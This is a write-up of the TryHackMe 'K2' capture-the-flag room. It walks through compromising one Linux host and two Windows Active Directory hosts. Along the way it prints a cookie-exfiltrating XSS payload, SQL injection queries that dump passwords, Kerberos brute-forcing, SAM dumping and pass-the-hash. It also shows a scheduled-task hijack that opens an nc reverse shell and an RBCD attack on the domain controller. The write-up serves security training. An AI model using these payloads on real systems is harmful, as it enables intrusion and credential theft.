# [K2](https://tryhackme.com/room/k2room)

## Are you able to make your way through the mountain?

# Base Camp

You have been asked to run a vulnerability test on the K2 network in order to see if there is any way that a malicious actor would be able to infiltrate.

The IT team assures you that the network is secure and that you won't be able to make your way up the mountain.

They have only provided you with their external website called `k2.thm`.

### What is the user flag?

1. Configure DNS resolution by adding the target's IP address and hostname to the local hosts file.

```bash
echo "<TARGET_IP> k2.thm" >> /etc/hosts
```

2. Run a comprehensive port scan with service version detection and default scripts to identify all open ports and running services.

```bash
nmap -p- -sVC k2.thm
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fb:52:02:e8:d9:4b:83:1a:52:c9:9c:b8:43:72:83:71 (RSA)
|   256 37:94:6e:99:c2:4f:24:56:fd:ac:77:e2:1b:ec:a0:9f (ECDSA)
|_  256 8f:3b:26:92:67:ec:cc:05:30:27:17:c5:df:9a:42:d2 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Dimension by HTML5 UP
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

3. Use gobuster to enumerate directories on the web server and discover hidden paths.

```bash
gobuster dir -u http://k2.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Results:**

```
home                 (Status: 200) [Size: 13229]
```

4. Use ffuf to perform virtual host enumeration by fuzzing the Host header. The `-fw 811` flag filters out responses containing 811 words, which is the default response size for the base domain, leaving only valid subdomains.

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://k2.thm -H "Host: FUZZ.k2.thm" -fw 811
```

**Results:**

```
admin                   [Status: 200, Size: 967, Words: 298, Lines: 24, Duration: 57ms]
it                      [Status: 200, Size: 1083, Words: 322, Lines: 25, Duration: 45ms]
```

5. Add the newly discovered subdomains `admin.k2.thm` and `it.k2.thm` to the `/etc/hosts`.

6. Navigate to `http://it.k2.thm/register` and create a new user account. After logging in, access `http://it.k2.thm/dashboard`, which provides a ticket submission form. The `admin.k2.thm` panel is only accessible to administrative users.

7. The `session` cookie returned after login contains a Flask session token: `eyJhdXRoX3VzZXJuYW1lIjoidXNlcm5hbWUxIiwiaWQiOjEsImxvZ2dlZGluIjp0cnVlfQ.ah23Kg.jlREwODwre__e2jDZomz8cclpw4`. Decoding the base64-encoded payload reveals the session structure:

```json
{
  "auth_username": "username1",
  "id": 1,
  "loggedin": true
}
```

> The session embeds the username and user ID in the cookie payload. If we can steal the admin's session cookie, we can impersonate them on `admin.k2.thm.`

8. Start a Python HTTP server on the attacking machine to receive the exfiltrated cookie from the XSS payload.

```bash
python3 -m http.server 8080
```

9. In the ticket submission form's `Description` field, inject the following Cross-Site Scripting payload. The script redirects the victim's browser to our HTTP server with their session cookie appended as a query parameter. The string concatenation `"cook" + "ie"` is used to bypass basic XSS filters that scan for the literal keyword cookie.

```html
<script>
  let c = "cook" + "ie";
  document.location = "http://<ATTACKER_IP>:8080/?c=" + document[c];
</script>
```

10.Navigate to `http://admin.k2.thm/dashboard` and use the browser developer tools to replace the session cookie with the captured admin cookie. Refreshing the page grants access to the administrative dashboard.

<img width="1368" height="632" alt="SCREEN01" src="https://github.com/user-attachments/assets/63fcb8dd-8cd3-40e9-a2fc-372974b7288b" />

11. In the admin dashboard, use Burp Suite to intercept the POST request sent to `/dashboard` when submitting a ticket title, and send it to the Repeater tab for manual SQL injection testing.

12. Test for SQL injection by modifying the `title` parameter. The following payloads enumerate the database structure and extract credentials:

```
title=' UNION SELECT 1,2,3 -- -

Returns 1, 2, and 3 ...
```

```
title=' UNION SELECT 1,2,concat(DATABASE()) -- -

Returns: ticketsite
```

```
title=' UNION SELECT 1,2,group_concat(schema_name) FROM information_schema.schemata -- -

Returns: information_schema,performance_schema,ticketsite
```

```
title=' UNION SELECT 1,2,group_concat(schema_name) FROM information_schema.schemata -- -

Returns: admin_auth,auth_users,tickets
```

```
title=' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema = database() and table_name ='admin_auth'-- -

Returns: admin_password,admin_username,email,id
```

```
title=' UNION SELECT 1,2,group_concat(admin_username,':',admin_password) FROM admin_auth -- -

Returns: james:Pwd@9tLNrC3!,rose:VrMAogdfxW!9,bob:PasSW0Rd321,steve:St3veRoxx32,cait:PartyAlLDaY!32,xu:L0v3MyDog!3!,ash:PikAchu!IshoesU!
```

<img width="1140" height="777" alt="SCREEN02" src="https://github.com/user-attachments/assets/0c494288-ea09-41ad-b0aa-4df4e532df46" />

13. Use the extracted credentials to log in via SSH as the user `james`.

```bash
ssh james@k2.thm
```

14. Navigate to james's home directory and read the user flag.

```bash
cat user.txt
```

<img width="435" height="104" alt="SCREEN03" src="https://github.com/user-attachments/assets/2d5904ee-1d1c-4232-b234-1cbcc0f734c5" />

---

### What is the root flag?

1. Check the current user's identity and group memberships.

```bash
id
```

**Results:**

```
uid=1002(james) gid=1002(james) groups=1002(james),4(adm)
```

2. The `adm` group membership allows reading system logs. Search through all log files for plaintext references to the user `rose`, which may reveal her password stored in a log entry.

```bash
cd /var/log
grep -iR rose
```

<img width="1026" height="519" alt="SCREEN05" src="https://github.com/user-attachments/assets/8e567c2d-8f8c-4d52-ae37-52f75149eb82" />

> The logs contain rose's password in plaintext. This password is also used as the root account password, indicating credential reuse.

3. Use the password found in the logs to switch directly to the root account.

```bash
su root
```

4. Read the root flag from root's home directory.

```bash
cat /root/root.txt
```

<img width="318" height="117" alt="SCREEN06" src="https://github.com/user-attachments/assets/f389c7ba-e82f-43a4-a608-41d55df54d53" />

---

### What are the usernames and passwords that had access to the server? List the usernames in alphabetical order with their corresponding password separated by a comma. Format is username:password.

1. The credentials are gathered from three different sources across the machine:

```
james - sql database
root - logs
rose - rose bash history
```

2. As root, read rose's bash history to retrieve her credentials.

```bash
# As root
cd /home/rose/
cat .bash_history
```

---

### Two users have their full names on display. What are their names? In Alphabetical order. Format is first name last name separated by a comma.

1. Read the `passwd` file to identify users whose GECOS field contains a full name.

```bash
cat /etc/passwd
```

<img width="724" height="522" alt="SCREEN04" src="https://github.com/user-attachments/assets/ac9e2123-9f7a-4a7b-bf54-9c78eeeb162e" />

---

# Middle Camp

The IT Team can't believe that you have made it past the first server. However, they feel confident that you won't make it much further.

Use all of the information gathered from your previous findings in order to keep making your way to the top.

### What is the user flag?

1. Configure DNS resolution for the new target machine by updating the hosts file.

```bash
echo "<TARGET_IP> k2.thm" >> /etc/hosts
```

2. Run a full port scan with service version detection on the new target to identify the services it exposes.

```bash
nmap -p- -sVC k2.thm
```

**Results:**

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-01 19:08:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: K2
|   NetBIOS_Domain_Name: K2
|   NetBIOS_Computer_Name: K2SERVER
|   DNS_Domain_Name: k2.thm
|   DNS_Computer_Name: K2Server.k2.thm
|   DNS_Tree_Name: k2.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2026-06-01T19:08:59+00:00
| ssl-cert: Subject: commonName=K2Server.k2.thm
| Not valid before: 2026-05-31T19:05:54
|_Not valid after:  2026-11-30T19:05:54
|_ssl-date: 2026-06-01T19:09:39+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: K2SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-06-01T19:09:00
|_  start_date: N/A
```

> This is a Windows Active Directory machine. Kerberos on port 88, LDAP on port 389, WinRM on port 5985, and the RDP banner reveal the machine hostname `K2Server.k2.thm`.

3. Add the discovered machine hostname `K2Server.k2.thm` to `/etc/hosts`.

4. Based on the two full names discovered via `passwd` in the Base Camp section, generate a list of common Active Directory username formats to test.

```
jbold
rosebud
james.bold
rose.bud
jamesb
roseb
j.bold
r.bud
```

5. Use kerbrute to enumerate valid Active Directory usernames against the Kerberos service. Kerbrute tests each username by requesting a Kerberos pre-authentication ticket.

```bash
./kerbrute_linux_amd64 userenum users.txt --domain k2.thm --dc <TARGET_IP>
```

**Results:**

```
2026/06/02 17:59:24 >  [+] VALID USERNAME:       j.bold@k2.thm
2026/06/02 17:59:24 >  [+] VALID USERNAME:       r.bud@k2.thm
2026/06/02 17:59:24 >  Done! Tested 8 usernames (2 valid) in 0.050 seconds
```

6. Create a wordlist from the passwords harvested via SQL injection in the Base Camp section, then attempt to authenticate as r.bud by reusing those credentials against the domain.

```bash
./kerbrute_linux_amd64 bruteuser --dc <TARGET_IP> --domain k2.thm passwords.txt r.bud
```

7. Connect to the Windows machine via WinRM using evil-winrm with the discovered credentials.

```bash
evil-winrm -i <TARGET_IP> -u '<USER_NAME>' -p '<PASSWORD>'
```

8. Navigate to `C:\Users\r.bud\Documents` and read both files found there. These contain notes left by rose regarding James Bold's account and the domain password policy.

**notes.txt**

```
Done:
1. Note was sent and James has already performed the required action. They have informed me that they kept the base password the same, they just added two more characters to meet the criteria. It is easier for James to remember it that way.

2. James's password meets the criteria.

Pending:
1. Give James Remote Access.
```

**note_to_james.txt**

```
Hello James:

Your password "rockyou" was found to only contain alphabetical characters. I have removed your Remote Access for now.

At the very least adhere to the new password policy:
1. Length of password must be in between 6-12 characters
2. Must include at least 1 special character
3. Must include at least 1 number between the range of 0-999
```

9. Write a Python script to generate all possible passwords for `j.bold` by placing one special character and one digit in every position combination relative to the base password `rockyou`.

```python
import itertools
import string

base_password = "rockyou"

special_chars = string.punctuation
numbers = "0123456789"

combinations = list(itertools.product(special_chars, numbers))

passwords = []

for special_char, number in combinations:
	  passwords.append(f"{special_char}{number}{base_password}")
	  passwords.append(f"{number}{special_char}{base_password}")

for special_char, number in combinations:
	  passwords.append(f"{base_password}{special_char}{number}")
	  passwords.append(f"{base_password}{number}{special_char}")

for special_char, number in combinations:
	  passwords.append(f"{special_char}{base_password}{number}")
	  passwords.append(f"{number}{base_password}{special_char}")

for password in passwords:
	  print(password)

with open("passwords.txt", "w") as f:
	  for password in passwords:
	      f.write(password + "\n")

print(f"Generated {len(passwords)} password combinations.")
```

10. Use the generated wordlist to brute-force `j.bold's` Kerberos authentication.

```bash
./kerbrute_linux_amd64 bruteuser --dc <TARGET_IP> --domain k2.thm passwords.txt j.bold
```

**Results:**

```
2026/06/02 18:23:45 >  [+] VALID LOGIN:  j.bold@k2.thm:#8rockyou
2026/06/02 18:23:45 >  Done! Tested 80 logins (1 successes) in 1.014 seconds
```

11. Start dnschef to intercept DNS queries and redirect them to the target's IP address. This is required so that bloodhound-python can resolve domain hostnames while using a custom nameserver.

```bash
dnschef --fakeip <TARGET_IP>
```

12. Run bloodhound-python to collect Active Directory data from the domain using `r.bud`'s credentials. With dnschef running, point the nameserver at `127.0.0.1`.

```bash
bloodhound-python -d k2.thm -c All -u 'r.bud' -p 'vRMkaVgdfxhW!8' -dc k2.thm -ns 127.0.0.1
```

13. Start the Neo4j database backend and launch the BloodHound GUI to visualise the collected Active Directory relationships and identify privilege escalation paths.

```bash
neo4j start
bloodhound
```

14. Exploit the `ForceChangePassword` privilege to reset `j.smith`'s password using `j.bold`'s credentials via an RPC call.

```bash
net rpc password "j.smith" "StrongP@ssword1234" -U "k2.thm"/"j.bold"%"#8rockyou" -S "k2.thm"
```

15. Connect to the machine as `j.smith` using the newly set password.

```bash
evil-winrm -i <TARGET_IP> -u '<USER_NAME>' -p '<PASSWORD>'
```

16. Navigate to `j.smith`'s Desktop and read the user flag.

```bash
cd ../Desktop
type user.txt
```

<img width="690" height="312" alt="SCREEN08" src="https://github.com/user-attachments/assets/9708a9a4-53a1-446f-b531-9ae93229376a" />

---

### What are the usernames found on the server? List the usernames in alphabetical order separated by a comma. Exclude the Administrator user.

1. List the contents of `C:\Users` to enumerate all accounts that have an interactive profile on the machine.

```bash
dir C:\Users
```

<img width="523" height="223" alt="SCREEN07" src="https://github.com/user-attachments/assets/deed4ac7-6ff8-4f5a-89d7-2bb71db5f773" />

---

### What is the root flag?

1. Check `j.smith`'s current privileges. The account has `SeBackupPrivilege` and `SeRestorePrivilege`, which allow reading and writing arbitrary files regardless of NTFS ACL restrictions.

```bash
whoami /priv
```

**Results:**

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

2. Abuse `SeBackupPrivilege` to export copies of the SAM and SYSTEM registry hives, which contain local account password hashes. Download the exported files to the attacking machine.

```bash
reg save hklm\sam c:\Windows\Tasks\SAM
reg save hklm\system c:\Windows\Tasks\SYSTEM
cd C:\Windows\Tasks
download SAM
download SYSTEM
```

3. Use impacket-secretsdump offline to extract NTLM hashes from the downloaded registry hives.

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

**Results:**

```
[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9545b61858c043477c350ae86c37b32f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

4. Perform a Pass-the-Hash attack using the extracted Administrator NTLM hash to authenticate as Administrator via WinRM, without needing the plaintext password.

```bash
evil-winrm -i <TARGET_IP> -u '<USER_NAME>' -H '<HASH>'
```

5. Read the flag:

```bash
cd ../Desktop
type root.txt
```

<img width="700" height="287" alt="SCREEN09" src="https://github.com/user-attachments/assets/8878f5bd-ee25-41aa-afee-71465683c810" />

---

### What is the Administrator's NTLM hash?

1. The hash was obtained in the previous step using `impacket-secretsdump -sam SAM -system SYSTEM LOCAL`. The Administrator's NTLM hash is `9545b61858c043477c350ae86c37b32f`.

---

# The Summit

You are almost there; you can see the summit from where you stand. Even the IT team is impressed at how far you have made into the network.

You can't stop now; with all of the information gathered, you will reach the very top and prove your skills.

### What is the user flag?

1. Perform a fast full-port scan on the new target to identify all open TCP ports before running a more detailed scan.

```bash
nmap -p- k2.thm
```

**Results:**

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49678/tcp open  unknown
49712/tcp open  unknown
49810/tcp open  unknown
```

2. Run a service version detection scan against the identified ports to gather detailed information about each service.

```bash
nmap -sVC -p 53,88,145,139,389,445,464,593,636,3268,3269,3389,5985,9389,49669,49670,49671,49674,49678,49711,49807 k2.thm
```

**Results:**

```
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-03 20:13:05Z)
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
145/tcp   filtered uaac
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: k2.thm, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=K2RootDC.k2.thm
| Not valid before: 2026-06-02T20:05:01
|_Not valid after:  2026-12-02T20:05:01
| rdp-ntlm-info:
|   Target_Name: K2
|   NetBIOS_Domain_Name: K2
|   NetBIOS_Computer_Name: K2ROOTDC
|   DNS_Domain_Name: k2.thm
|   DNS_Computer_Name: K2RootDC.k2.thm
|   DNS_Tree_Name: k2.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2026-06-03T20:13:54+00:00
|_ssl-date: 2026-06-03T20:14:34+00:00; -1s from scanner time.
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open     mc-nmf        .NET Message Framing
49669/tcp open     msrpc         Microsoft Windows RPC
49670/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open     msrpc         Microsoft Windows RPC
49674/tcp open     msrpc         Microsoft Windows RPC
49678/tcp open     msrpc         Microsoft Windows RPC
49711/tcp filtered unknown
49807/tcp filtered unknown
Service Info: Host: K2ROOTDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

> The RDP certificate's `commonName` field reveals the machine hostname is `K2RootDC.k2.thm`, identifying this as the domain's Root Domain Controller.

3. Add the `K2RootDC.k2.thm` hostname to the `/etc/hosts` .

4. The `Administrator` account's NTLM hash obtained from the SAM dump on K2Server is also valid on the Root DC due to password reuse. Use a Pass-the-Hash attack to establish a WinRM session.

```bash
evil-winrm -i k2.thm -u 'j.smith' -H '9545b61858c043477c350ae86c37b32f'
```

5. Enumerate the filesystem to find interesting scripts. Navigate to `C:\Scripts` and inspect the `backup.bat` file, which is executed periodically by a scheduled task.

```bash
cd ../../..
cd Scripts
type backup.bat
```

**Results:**

```bat
copy C:\Users\o.armstrong\Desktop\notes.txt C:\Users\o.armstrong\Documents\backup_notes.txt
```

> The script copies `o.armstrong`'s notes file on a schedule. Since `j.smith` has `SeRestorePrivilege`, the bat file can be overwritten to redirect the copy destination to a path readable by `j.smith`, effectively reading arbitrary files belonging to `o.armstrong` when the task next executes.

6. Replace the contents of `backup.bat` to redirect the copy target into `C:\Scripts`, a directory accessible to `j.smith`. Grant `o.armstrong` full permissions on the modified script so the scheduled task can execute it, then wait for the task to run and read the result.

```bash
rm backup.bat
echo 'copy C:\Users\o.armstrong\Desktop\notes.txt C:\Scripts\notes.txt' > backup.bat
Set-Content -Path "C:\Scripts\backup.bat" -Value 'copy C:\Users\o.armstrong\Desktop\notes.txt C:\Scripts\notes.txt'
icacls "C:\Scripts\backup.bat" /grant o.armstrong:F
type notes.txt
```

**Results:**

```
Things to check:


1. Check on the IT Website hosted on the Linux Server. Is it vulnerable?
2. Enforce the password policy on everyone!
```

7. Modify backup.bat again to copy `o.armstrong`'s user flag to `C:\Scripts`, then retrieve it after the scheduled task executes.

```bash
Set-Content -Path "C:\Scripts\backup.bat" -Value 'copy C:\Users\o.armstrong\Desktop\user.txt C:\Scripts\user.txt'
type user.txt
```

<img width="512" height="268" alt="SCREEN10" src="https://github.com/user-attachments/assets/051391ee-f777-489d-87fe-571b0fdfd336" />

---

### What is the root flag?

1. Upload a netcat binary to the target. This will be used to receive a reverse shell running in o`.armstrong`'s context when the scheduled task next executes the modified `backup.bat`.

```bash
upload nc.exe
```

2. Start a netcat listener on the attacking machine to receive the incoming reverse shell connection.

```bash
nc -lvnp 4444
```

3. Modify `backup.bat` to execute netcat back to the attacking machine with a PowerShell shell. When the scheduled task runs as `o.armstrong`, a reverse shell will be established.

```bash
Set-Content -Path "C:\Scripts\backup.bat" -Value 'C:\Scripts\.\nc.exe <ATTACKER_IP> 4444 -e powershell'
```

4. Once the reverse shell is received as `o.armstrong`, run bloodhound-python from the attacking machine to collect fresh AD data using `j.smith`'s credentials and analyse the new account's position in the domain.

```bash
bloodhound-python -d k2.thm -c All -u 'j.smith' --hashes '****:****' -dc k2.thm -ns 127.0.0.1
```

5. Start Responder on the attacking machine to capture incoming NTLM authentication attempts. This will intercept the NTLMv2 hash when `o.armstrong`'s session is triggered to authenticate outbound.

```bash
responder -I tun0
```

6. From the `o.armstrong` reverse shell, trigger an outbound SMB/HTTP authentication request to the attacking machine. Responder will capture the NTLMv2 challenge-response hash.

```bash
curl file://<ATTACKER_IP>/leak.leak.html
```

<img width="1016" height="166" alt="SCREEN11" src="https://github.com/user-attachments/assets/764c8824-9d7a-4abf-9e1f-53a0638bae9c" />

7. Save the captured NTLMv2 hash to a file and crack it with John the Ripper using the rockyou wordlist.

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

8. Execute a Resource-Based Constrained Delegation attack in three stages using Impacket scripts:

- **Stage 1**: Add a fake computer account to the domain using `o.armstrong`'s credentials.
- **Stage 2**: Configure RBCD so that `ATTACKERSYSTEM$` is allowed to delegate to `K2ROOTDC$`, granting it the ability to request service tickets on behalf of any domain user.
- **Stage 3**: Request a Kerberos service ticket for the `cifs` service on the Root DC, impersonating the domain Administrator.

```bash
python3 addcomputer.py -method SAMR -computer-name 'ATTACKERSYSTEM$' -computer-pass 'StrongP@ssword1234!' -dc-host K2ROOTDC.K2.THM -domain-netbios K2.THM 'K2.THM/o.armstrong:arMStronG08'
python3 rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'K2ROOTDC$' -action 'write' 'K2.THM/o.armstrong:arMStronG08'
python3 getST.py -spn 'cifs/K2ROOTDC.k2.thm' -impersonate 'Administrator' 'K2.THM/attackersystem$:StrongP@ssword1234!'
export KRB5CCNAME=Administrator@cifs_K2ROOTDC.k2.thm@K2.THM.ccache
netexec smb k2rootdc.k2.thm -u Administrator --use-kcache --ntds
```

<img width="1046" height="406" alt="SCREEN12" src="https://github.com/user-attachments/assets/5329dee5-8fa6-4a39-8590-713056015be7" />

9. Use the domain Administrator's NTLM hash extracted by netexec to authenticate to the Root DC via WinRM.

```bash
evil-winrm -i k2.thm -u 'Administrator' -H '15ecc755a43d2e7c8001215609d94b90'
```

10. Navigate to the Administrator's Desktop and read the root flag.

```bash
cd ../Desktop
type root.txt
```

<img width="692" height="300" alt="SCREEN13" src="https://github.com/user-attachments/assets/e6056272-445b-49ad-91be-6a469c0a1aec" />
